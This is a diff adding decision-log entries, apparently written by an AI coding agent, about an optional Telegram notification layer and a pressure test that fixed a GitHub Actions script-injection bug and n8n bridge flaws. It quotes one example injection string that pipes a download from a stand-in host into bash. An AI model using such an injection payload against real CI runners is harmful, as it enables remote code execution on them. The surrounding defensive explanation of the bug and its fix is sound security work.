@@ -551,3 +551,116 @@ agentjacking check, and the ambition itself has never survived contact with "wha
 actual evidence support right now." That's worth trusting as a process, not just a
 one-off: keep pressure-testing the vision against research and real run history rather
 than either dismissing external ideas wholesale or building toward all of them at once.
+
+---
+
+## 2026-07-01 — PUSH: an optional Telegram human-in-the-loop layer, kept out of the core
+
+Added PUSH (`.claude/skills/weaponx-push/`): plain-English checkpoints while a run is in
+progress, and decision briefs at human-gates (retry-cap, evaluator disagreement, PR ready)
+that the operator can answer from their phone to resume the loop. Two delivery paths — a
+local long-poll bridge (`bin/push-bridge.sh`, curl + jq only) for when a session is running
+on the operator's machine, and a GitHub Actions cold-start path (`push-poll.yml` +
+`push-dispatch.yml`) for kicking off a task from a phone with no local session.
+
+**Key decision: PUSH is gated entirely behind config, never a hard dependency.** The engine
+must not gain a standing dependency on an external service. So PUSH is off unless
+`TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are both set; when unset, the bridge exits with
+a "skipping" status and the loop behaves exactly as before. The wiring into Moves 4 and 5 is
+strictly additive — the two new steps are clearly marked "optional, only if configured" and
+run *in addition to* the existing `PushNotification`/trace behavior, never instead of it.
+This is why the change touches how the loop *behaves* (new optional notifications) but does
+not weaken any existing guarantee — worth logging here rather than only in git history.
+
+**Key decision: PUSH lives outside the portable core, and is itself split.** The bridge
+script + docs are reasonably portable (a fork can reuse them with the two env vars), but the
+GitHub Actions workflows are specific to this repo's CI and its `weaponx-approval`
+environment, so they're this instance's wiring, not reusable engine. CLAUDE.md's
+engine-vs-instance paragraph now says exactly this.
+
+**Never-auto-ship held on the cloud path too.** `push-dispatch.yml`'s ship step depends on
+the `weaponx-approval` GitHub Environment (human required-reviewer), so the cold-start path
+still can't ship without explicit human approval — the same boundary as the local path, kept
+enforced rather than merely instructed. Deliberate known gap: the cross-job branch/PR
+handoff in that ship step is a documented placeholder (the human-approval gate was wired
+first, on purpose); see the note in the workflow and SETUP.md.
+
+**Corrected a now-stale precondition.** `weaponx-discover`'s SKILL.md (and the main
+orchestrator's Handoff/Persistence) previously assumed there was no `origin` remote. There
+now is one (`dsvxmedia/Weapon-X`), so cloud scheduling is technically unblocked — updated the
+discover skill to say so while staying honest that no discover-specific scheduled workflow is
+turned on by default. (The main orchestrator's remote-conditional logic already branches on
+whether a remote exists at runtime, so it stays correct as written.)
+
+## 2026-07-01 — PUSH pressure test: three real bugs, one hard platform blocker, one process lesson
+
+Asked to actually try to break PUSH end to end and fix what's found, then log it — not a
+theoretical review, a live one against the real deployed n8n workflow and real Telegram bot.
+Findings, in the order they matter:
+
+**1. Script injection in `push-poll.yml` (found by grep, not by exploiting it).** The
+"Trigger dispatch workflow" step interpolated `${{ steps.poll.outputs.task }}` — text
+derived from an untrusted Telegram message — directly into a `run:` shell command via GHA
+templating. That's literal text substitution before bash parses it: a task string
+containing `` "; curl evil.sh | bash # `` would execute on the runner with that job's
+`actions:write` permissions, not just become task text. `push-dispatch.yml` already avoided
+this correctly (routes `TASK` through `env:`); `push-poll.yml` didn't get the same treatment
+when it was written. Found by systematically grepping every `${{ }}` inside every `run:`
+block across both workflow files rather than trusting memory of what was already checked —
+that method is worth repeating any time a new workflow file touches untrusted input. Fixed:
+routed through `env: TASK_TEXT`.
+
+**2. The n8n bridge treated any message as a task, not just `/weaponx` commands.** The
+Parse node's logic was `let task = text;` by default, only narrowing it if the message
+happened to start with `/weaponx`. A bare "hey what's up" sent to the bot would have been
+dispatched as a real task. Rewrote to strict opt-in: task is empty unless the first
+whitespace-separated token is exactly `/weaponx` (case-insensitive), which the allow-list
+`If` node already gates on. Verified via three synthetic webhook POSTs plus checking n8n's
+own execution log afterward (not just the webhook's ack, which is uninformative — it always
+returns "Workflow was started" regardless of what happens downstream) — all three correctly
+stopped at the `If` node with none reaching Ack or the GitHub dispatch call.
+
+**3. A failed GitHub dispatch call failed completely silently.** This is the bug the user's
+own first real test hit: `push-dispatch.yml` didn't exist on `main` yet (still on the PR
+branch), the dispatch call 404'd, and n8n just marked the execution as errored internally
+with zero notification — the user got the "Got it, starting..." ack and then nothing,
+because it errored on a completely separate node. Confirmed via n8n's execution log
+(`executions/27840`, `27841`) that this is exactly what happened, not a hypothesis. Fixed
+by setting `neverError: true` on the HTTP Request node (so it always continues instead of
+throwing) and adding an explicit `Dispatch OK?` branch that sends a real Telegram failure
+message when the status code isn't 2xx. Re-verified live: a subsequent test correctly routed
+through the new failure path and the extracted `statusCode` matched GitHub's real response.
+
+**4. Hard platform blocker, not a bug: cold-start (Path 2) cannot be tested at all until
+PR #3 merges to `main`.** Spent real effort chasing what looked like a `ref` problem
+(pointed the dispatch call at `weaponx/push-addon` instead of `main`, still got 404) before
+finding the actual cause: `gh api repos/dsvxmedia/Weapon-X/actions/workflows` returns zero
+registered workflows for this repo right now. GitHub's `workflow_dispatch` REST endpoint
+resolves a workflow by filename against the repo's *registered* workflow list, which is
+populated from the default branch — a workflow file that has only ever existed on a
+feature branch isn't dispatchable via that API at all, regardless of which `ref` you pass.
+The same constraint applies to `push-poll.yml`'s own `schedule:` trigger (GitHub only fires
+scheduled workflows that exist on the default branch) and to its `gh workflow run` call
+(same underlying API). **Nothing about Path 2 can be end-to-end verified pre-merge** — not
+a code defect, a real precondition worth stating plainly rather than discovering again next
+time. Reverted the `ref` back to `main` since it's correct for the post-merge state and
+doesn't fix anything pre-merge either way.
+
+**Process lesson, logged because it wasted a real cycle:** tried to simulate an inbound
+Telegram test message using the bot's own `sendMessage` API. That API posts a message *from*
+the bot *into* a chat — it cannot simulate a message arriving *from* the user, since I have
+no access to a real Telegram user session, only the bot's. It produced a stray, slightly
+confusing message in the user's actual Telegram client and tested nothing. The correct
+method (already in use for the other three synthetic tests) is POSTing a Telegram-update-
+shaped JSON body directly to n8n's own webhook URL, which is exactly what a real inbound
+message looks like from n8n's side. Worth remembering before reaching for `sendMessage` as
+a test tool again.
+
+**What's now verified vs. still open:** the n8n routing/gating logic is verified against
+real executions, not just read. The failure-notification path is verified against a real
+failure. The injection fix is a code-level fix, not yet exercised against a live malicious
+payload (didn't attempt real code execution against the production runner — the risk was
+confirmed by reading the GHA templating mechanics, which is the standard way this class of
+bug is found and fixed, not by proving impact). Full Path 2 happy-path (message → dispatch
+→ actual weaponx run → PR) remains unverified until `main` has the workflow files — that's
+the next real test once PR #3 merges, not before.
